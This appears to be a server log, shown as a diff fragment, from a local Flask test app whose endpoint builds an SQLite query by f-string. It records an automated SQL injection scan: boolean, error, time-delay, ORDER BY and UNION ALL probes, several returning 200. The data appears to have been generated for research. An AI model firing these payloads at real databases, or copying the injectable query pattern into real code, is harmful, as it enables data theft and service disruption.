+DEBUG:web:/query/1 AND (SELECT FROM_HEX(NULL)) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT FROM_HEX(NULL)) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: FROM_HEX
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20FROM_HEX%28NULL%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT IF(ROWNUMBER()>0,CONVERT(NULL,TINYINT),NULL))) IS NULL
+ERROR:web:Exception on /query/1 AND (SELECT IF(ROWNUMBER()>0,CONVERT(NULL,TINYINT),NULL))) IS NULL [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near ")": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "[35m[1mGET /query/1%20AND%20%28SELECT%20IF%28ROWNUMBER%28%29%3E0%2CCONVERT%28NULL%2CTINYINT%29%2CNULL%29%29%29%20IS%20NULL HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 AND (SELECT UNLIKELY(NULL)) IS NULL
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "GET /query/1%20AND%20%28SELECT%20UNLIKELY%28NULL%29%29%20IS%20NULL HTTP/1.1" 200 -
+DEBUG:web:/query/1 AND (SELECT CHAR(76,103,122,65))='DcKO'
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:48] "GET /query/1%20AND%20%28SELECT%20CHAR%2876%2C103%2C122%2C65%29%29%3D%27DcKO%27 HTTP/1.1" 200 -
+DEBUG:web:/query/(SELECT CONCAT(CONCAT('qqpqq',(CASE WHEN (2385=2385) THEN '1' ELSE '0' END)),'qvvbq'))
+ERROR:web:Exception on /query/(SELECT CONCAT(CONCAT('qqpqq',(CASE WHEN (2385=2385) THEN '1' ELSE '0' END)),'qvvbq')) [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: CONCAT
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/%28SELECT%20CONCAT%28CONCAT%28%27qqpqq%27%2C%28CASE%20WHEN%20%282385%3D2385%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qvvbq%27%29%29 HTTP/1.1[0m" 500 -
+DEBUG:web:/query/SELECT CHAR(113,113,112,113,113)||(CASE WHEN (7448=7448) THEN 1 ELSE 0 END)||CHAR(113,118,118,98,113)
+ERROR:web:Exception on /query/SELECT CHAR(113,113,112,113,113)||(CASE WHEN (7448=7448) THEN 1 ELSE 0 END)||CHAR(113,118,118,98,113) [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: near "SELECT": syntax error
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7C%28CASE%20WHEN%20%287448%3D7448%29%20THEN%201%20ELSE%200%20END%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29 HTTP/1.1[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/1%3BSELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/1%3BSELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29 HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/1%20AND%201028%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29 HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/1%20OR%202434%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29 HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/1%20AND%203529%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/1%20OR%208013%3DLIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1[0m" 404 -
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[33mGET /query/%28SELECT%20LIKE%28CHAR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29%29 HTTP/1.1[0m" 404 -
+DEBUG:web:/query/1 ORDER BY 1-- fNAQ
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "GET /query/1%20ORDER%20BY%201--%20fNAQ HTTP/1.1" 200 -
+DEBUG:web:/query/1 ORDER BY 4016-- pGYC
+ERROR:web:Exception on /query/1 ORDER BY 4016-- pGYC [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20ORDER%20BY%204016--%20pGYC HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 ORDER BY 10-- nwBD
+ERROR:web:Exception on /query/1 ORDER BY 10-- nwBD [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20ORDER%20BY%2010--%20nwBD HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 ORDER BY 6-- cnHk
+ERROR:web:Exception on /query/1 ORDER BY 6-- cnHk [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20ORDER%20BY%206--%20cnHk HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 ORDER BY 4-- ycmI
+ERROR:web:Exception on /query/1 ORDER BY 4-- ycmI [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20ORDER%20BY%204--%20ycmI HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 ORDER BY 3-- KvlA
+ERROR:web:Exception on /query/1 ORDER BY 3-- KvlA [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20ORDER%20BY%203--%20KvlA HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 ORDER BY 2-- liNH
+ERROR:web:Exception on /query/1 ORDER BY 2-- liNH [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 1
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20ORDER%20BY%202--%20liNH HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 UNION ALL SELECT CHAR(113,113,112,113,113)||CHAR(121,85,73,110,86,83,73,88,111,102,116,69,122,119,117,111,75,99,69,122,70,103,81,120,75,76,102,121,122,84,103,117,69,76,115,120,70,97,66,81)||CHAR(113,118,118,98,113)-- HSWN
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "GET /query/1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7CCHAR%28121%2C85%2C73%2C110%2C86%2C83%2C73%2C88%2C111%2C102%2C116%2C69%2C122%2C119%2C117%2C111%2C75%2C99%2C69%2C122%2C70%2C103%2C81%2C120%2C75%2C76%2C102%2C121%2C122%2C84%2C103%2C117%2C69%2C76%2C115%2C120%2C70%2C97%2C66%2C81%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29--%20HSWN HTTP/1.1" 200 -
+DEBUG:web:/query/1 UNION ALL SELECT CHAR(113,113,112,113,113)||CHAR(121,85,73,110,86,83,73,88,111,102,116,69,122,119,117,111,75,99,69,122,70,103,81,120,75,76,102,121,122,84,103,117,69,76,115,120,70,97,66,81)||CHAR(113,118,118,98,113) UNION ALL SELECT CHAR(113,113,112,113,113)||CHAR(111,80,117,120,65,115,106,115,75,90,78,113,97,121,110,120,119,81,73,98,67,107,103,106,88,115,113,81,72,112,120,98,110,98,90,111,111,82,113,103)||CHAR(113,118,118,98,113)-- SrWM
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "GET /query/1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7CCHAR%28121%2C85%2C73%2C110%2C86%2C83%2C73%2C88%2C111%2C102%2C116%2C69%2C122%2C119%2C117%2C111%2C75%2C99%2C69%2C122%2C70%2C103%2C81%2C120%2C75%2C76%2C102%2C121%2C122%2C84%2C103%2C117%2C69%2C76%2C115%2C120%2C70%2C97%2C66%2C81%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7CCHAR%28111%2C80%2C117%2C120%2C65%2C115%2C106%2C115%2C75%2C90%2C78%2C113%2C97%2C121%2C110%2C120%2C119%2C81%2C73%2C98%2C67%2C107%2C103%2C106%2C88%2C115%2C113%2C81%2C72%2C112%2C120%2C98%2C110%2C98%2C90%2C111%2C111%2C82%2C113%2C103%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29--%20SrWM HTTP/1.1" 200 -
+DEBUG:web:/query/1 UNION ALL SELECT CHAR(113,113,112,113,113)||CHAR(121,85,73,110,86,83,73,88,111,102,116,69,122,119,117,111,75,99,69,122,70,103,81,120,75,76,102,121,122,84,103,117,69,76,115,120,70,97,66,81)||CHAR(113,118,118,98,113) FROM (SELECT 0 AS fCpm UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS cxgf-- MpcK
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "GET /query/1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7CCHAR%28121%2C85%2C73%2C110%2C86%2C83%2C73%2C88%2C111%2C102%2C116%2C69%2C122%2C119%2C117%2C111%2C75%2C99%2C69%2C122%2C70%2C103%2C81%2C120%2C75%2C76%2C102%2C121%2C122%2C84%2C103%2C117%2C69%2C76%2C115%2C120%2C70%2C97%2C66%2C81%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29%20FROM%20%28SELECT%200%20AS%20fCpm%20UNION%20SELECT%201%20UNION%20SELECT%202%20UNION%20SELECT%203%20UNION%20SELECT%204%20UNION%20SELECT%205%20UNION%20SELECT%206%20UNION%20SELECT%207%20UNION%20SELECT%208%20UNION%20SELECT%209%20UNION%20SELECT%2010%20UNION%20SELECT%2011%20UNION%20SELECT%2012%20UNION%20SELECT%2013%20UNION%20SELECT%2014%29%20AS%20cxgf--%20MpcK HTTP/1.1" 200 -
+DEBUG:web:/query/1 UNION ALL SELECT CONCAT(CONCAT('qqpqq',(CASE WHEN (9057=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9057) THEN '1' ELSE '0' END)),'qvvbq')-- dDeb
+ERROR:web:Exception on /query/1 UNION ALL SELECT CONCAT(CONCAT('qqpqq',(CASE WHEN (9057=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9057) THEN '1' ELSE '0' END)),'qvvbq')-- dDeb [GET]
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 2070, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1515, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1513, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/lib/python3/dist-packages/flask/app.py", line 1499, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args)
+  File "/home/kali/masters/data-generation/no-quote/web.py", line 14, in query
+    res = cur.execute(f"SELECT name FROM users WHERE favorite_number={number}")
+sqlite3.OperationalError: no such function: CONCAT
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:55] "[35m[1mGET /query/1%20UNION%20ALL%20SELECT%20CONCAT%28CONCAT%28%27qqpqq%27%2C%28CASE%20WHEN%20%289057%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%209057%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qvvbq%27%29--%20dDeb HTTP/1.1[0m" 500 -
+DEBUG:web:/query/1 UNION ALL SELECT CHAR(113,113,112,113,113)||(SELECT (CASE WHEN (LAST_INSERT_ROWID()=LAST_INSERT_ROWID()) THEN 1 ELSE 0 END))||CHAR(113,118,118,98,113)-- tLPx
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:59] "GET /query/1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28LAST_INSERT_ROWID%28%29%3DLAST_INSERT_ROWID%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29--%20tLPx HTTP/1.1" 200 -
+DEBUG:web:/query/1 UNION ALL SELECT CHAR(113,113,112,113,113)||(SELECT (CASE WHEN (SQLITE_VERSION()=SQLITE_VERSION()) THEN 1 ELSE 0 END))||CHAR(113,118,118,98,113)-- HLBk
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:59] "GET /query/1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28SQLITE_VERSION%28%29%3DSQLITE_VERSION%28%29%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29--%20HLBk HTTP/1.1" 200 -
+DEBUG:web:/query/1 UNION ALL SELECT CHAR(113,113,112,113,113)||(SELECT (CASE WHEN (RANDOMBLOB(-1)>0) THEN 1 ELSE 0 END))||CHAR(113,118,118,98,113)-- SWmn
+INFO:werkzeug:127.0.0.1 - - [14/Aug/2023 06:56:59] "GET /query/1%20UNION%20ALL%20SELECT%20CHAR%28113%2C113%2C112%2C113%2C113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%28RANDOMBLOB%28-1%29%3E0%29%20THEN%201%20ELSE%200%20END%29%29%7C%7CCHAR%28113%2C118%2C118%2C98%2C113%29--%20SWmn HTTP/1.1" 200 -
